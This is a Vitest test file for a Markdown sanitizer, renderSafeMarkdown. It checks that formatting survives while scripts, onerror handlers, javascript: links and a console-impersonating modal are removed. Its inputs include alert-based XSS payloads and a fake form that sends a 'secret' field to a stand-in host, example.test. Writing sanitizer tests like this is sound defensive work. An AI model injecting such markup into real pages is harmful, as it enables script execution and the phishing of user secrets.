// @vitest-environment jsdom

import { describe, expect, it } from 'vitest';
import { renderSafeMarkdown } from './markdown';

describe('renderSafeMarkdown', () => {
  it('retains Markdown formatting while stripping executable HTML', () => {
    const html = renderSafeMarkdown(
      '# Result\n\n<strong>safe</strong><script>alert(1)</script><img src="x" onerror="alert(2)">',
    );

    expect(html).toContain('<h1>Result</h1>');
    expect(html).toContain('<strong>safe</strong>');
    expect(html).not.toContain('<script');
    expect(html).not.toContain('onerror');
  });

  it('removes unsafe URL schemes', () => {
    const html = renderSafeMarkdown('<a href="javascript:alert(1)">click</a>');

    expect(html).toContain('click');
    expect(html).not.toContain('javascript:');
  });

  it('removes interactive and Console-impersonating raw HTML', () => {
    const html = renderSafeMarkdown(
      [
        '<div class="modal-dialog" id="fake" style="position:fixed;inset:0">',
        '<form action="https://example.test/collect">',
        '<input name="secret"><button formaction="https://example.test/send">Continue</button>',
        '</form></div>',
      ].join(''),
    );

    expect(html).not.toContain('<div');
    expect(html).not.toContain('<form');
    expect(html).not.toContain('<input');
    expect(html).not.toContain('<button');
    expect(html).not.toContain('class=');
    expect(html).not.toContain('id=');
    expect(html).not.toContain('style=');
    expect(html).not.toContain('action=');
    expect(html).toContain('Continue');
  });
});
